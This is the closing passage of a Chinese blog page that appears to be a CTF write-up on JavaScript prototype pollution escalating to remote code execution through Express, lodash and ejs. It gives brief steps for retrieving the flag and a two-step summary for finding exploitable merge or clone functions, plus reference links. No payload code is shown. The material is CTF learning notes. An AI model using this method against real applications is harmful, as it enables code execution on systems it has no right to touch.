<p>来自：<br><a target="_blank" rel="noopener" href="https://evi0s.com/2019/08/30/expresslodashejs-%e4%bb%8e%e5%8e%9f%e5%9e%8b%e9%93%be%e6%b1%a1%e6%9f%93%e5%88%b0rce/">https://evi0s.com/2019/08/30/expresslodashejs-%e4%bb%8e%e5%8e%9f%e5%9e%8b%e9%93%be%e6%b1%a1%e6%9f%93%e5%88%b0rce/</a></p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210724161343.png" alt="img" style="zoom:67%;">
要记得吧传输的内容格式改为json的，然后登陆/info让其被渲染，然后再登录/reader将flag下载下来即可

<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>由于语法还是有很多不懂，但还好学沙盒逃逸的时候有掌握一点语法，所以原理还是可以看懂的，但是构造语句还是不太行<br>总结一下js的原型链污染<br>1.寻找merge或者clone函数<br>2.寻找使用这两个函数的对象，查看其是否可控，能渲染</p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/275619.html">https://www.freebuf.com/articles/web/275619.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LEOGG321/p/13448463.html">https://www.cnblogs.com/LEOGG321/p/13448463.html</a></p>
<p>js的字符：<a target="_blank" rel="noopener" href="https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html">https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html</a></p>
</div><hr></div><nav id="pagination"><div class="pagination"><a class="extend prev" rel="prev" href="/page/8/"><i class="fa fa-chevron-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/8/">8</a><span class="page-number current">9</span><a class="page-number" href="/page/10/">10</a><span class="space">&hellip;</span><a class="page-number" href="/page/21/">21</a><a class="extend next" rel="next" href="/page/10/"><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2022 By vague huang</div><div class="framework-info"><span>Driven - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span><span></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/lib/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.9.0"></script><script src="/js/fancybox.js?version=1.9.0"></script><script src="/js/sidebar.js?version=1.9.0"></script><script src="/js/copy.js?version=1.9.0"></script><script src="/js/fireworks.js?version=1.9.0"></script><script src="/js/transition.js?version=1.9.0"></script><script src="/js/scroll.js?version=1.9.0"></script><script src="/js/head.js?version=1.9.0"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false});</script></body></html>